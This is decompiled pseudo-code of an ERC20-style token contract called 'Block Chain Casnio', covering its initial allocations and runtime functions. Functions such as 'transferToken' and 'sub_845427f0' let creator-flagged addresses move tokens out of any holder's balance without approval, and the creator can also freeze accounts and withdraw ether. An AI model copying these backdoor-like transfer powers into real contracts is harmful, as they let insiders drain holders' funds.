contract main {


// =======================  Init code  ======================


mapping of uint256 stor1;
uint256 stor3;
uint256 stor4;
uint256 stor5;
uint256 stor6;
address stor10;
array of uint256 stor12;
address stor13;
address stor14;
address stor15;
address stor16;
uint256 stor17;

function _fallback() payable {
    stor3 = 1
    stor4 = 10^12
    stor5 = 10^15
    stor6 = 10^18
    bool(stor12.length) = 0
    stor12.length.field_1 = 3
    stor12.length.field_8 = '1.0' / 256
    idx = 0
    while stor12.length + 31 / 32 > idx:
        stor12[idx].field_0 = 0
        idx = idx + 1
        continue 
    stor13 = 0x5f9b7f40a9b6afcda7ae8e3cf7b0a22911f66dac
    stor14 = 0xbc3fbda560970acadb02f8895ffd459e6ed98320
    stor15 = 0xac81e52156c301c6aae4db44bafa192189f84068
    stor16 = 0x40480b428f3a96f9262c879d4dc5161c3ddaba52
    stor17 = 1000000000 * 10^18
    require not msg.value
    stor10 = msg.sender
    stor1[stor13] = 300000000 * 10^18
    stor1[stor14] = 150000000 * 10^18
    stor1[stor15] = 300000000 * 10^18
    stor1[stor16] = 250000000 * 10^18
    return code.data[1195 len 7513]
}



// =====================  Runtime code  =====================


const name = 'Block Chain Casnio'

const decimals = 18

const symbol = 'BC'

const sub_c6f7737e(?) = 300000000 * 10^18

const sub_ef0c8e4a(?) = 250000000 * 10^18

const RESEARCH_DEVELOPMENT = 300000000 * 10^18

const PRIVATEPLACEMENT = 150000000 * 10^18


mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 stor5;
mapping of uint256 lockAccount;
mapping of uint8 stor8;
mapping of uint8 stor9;
address creatorAddress;
address creator_newAddress;
array of uint256 version;
uint256 totalSupply;

function creator() {
    return creatorAddress
}

function totalSupply() {
    return totalSupply
}

function sub_2dc4fa9a(?) {
    return bool(stor9[arg1])
}

function sub_396d0931(?) {
    return bool(stor8[arg1])
}

function lockAccount(address arg1) {
    return lockAccount[arg1]
}

function version() {
    return version[0 len version.length]
}

function balanceOf(address arg1) {
    return balanceOf[address(arg1)]
}

function creator_new() {
    return creator_newAddress
}

function sub_abfad101(?) {
    return bool(stor8[address(arg1)])
}

function lockAccountOf(address arg1) {
    return lockAccount[address(arg1)]
}

function allowance(address arg1, address arg2) {
    return allowance[address(arg1)][address(arg2)]
}

function sub_e42b668b(?) {
    return bool(stor9[address(arg1)])
}

function _fallback() payable {
  stop
}

function sub_28f0f9c6(?) {
    require msg.sender == creatorAddress
    stor9[address(arg1)] = uint8(arg2)
}

function sub_a3146ff5(?) {
    require msg.sender == creatorAddress
    stor8[address(arg1)] = uint8(arg2)
}

function transferOwnershipSend(address arg1) {
    require msg.sender == creatorAddress
    creator_newAddress = arg1
}

function transferOwnershipReceive() {
    require msg.sender == creator_newAddress
    creatorAddress = creator_newAddress
}

function setLockAccount(address arg1, uint256 arg2) {
    require msg.sender == creatorAddress
    lockAccount[address(arg1)] = arg2
    emit LockFunds(address(arg1), arg2);
}

function getEth(uint256 arg1) {
    require msg.sender == creatorAddress
    call creatorAddress with:
       value arg1 * stor5 wei
         gas 2300 * is_zero(value) wei
    return not bool(ext_call.success)
}

function approve(address arg1, uint256 arg2) {
    if block.timestamp < lockAccount[address(msg.sender)]:
        return 0
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transferToken(address arg1, address arg2, uint256 arg3) {
    if not stor9[address(msg.sender)]:
        return 0
    if balanceOf[address(arg1)] < arg3:
        return 0
    if arg3 <= 0:
        return 0
    balanceOf[address(arg1)] -= arg3
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    return 1
}

function transfer(address arg1, uint256 arg2) {
    if balanceOf[address(msg.sender)] < arg2:
        return 0
    if arg2 <= 0:
        return 0
    if block.timestamp < lockAccount[address(msg.sender)]:
        return 0
    balanceOf[address(msg.sender)] -= arg2
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    if balanceOf[address(arg1)] < arg3:
        return 0
    if allowance[address(arg1)][address(msg.sender)] < arg3:
        return 0
    if arg3 <= 0:
        return 0
    balanceOf[address(arg2)] += arg3
    balanceOf[address(arg1)] -= arg3
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Transfer(arg3, arg1, arg2);
    return 1
}

function sub_845427f0(?) {
    if not stor8[address(msg.sender)]:
        return 0
    if balanceOf[address(msg.sender)] < arg3:
        return 0
    if balanceOf[address(arg1)] < arg3:
        return 0
    if arg3 <= 0:
        return 0
    balanceOf[address(msg.sender)] -= arg3
    balanceOf[stor10] += arg3
    balanceOf[address(arg1)] -= arg3
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    return 1
}



}
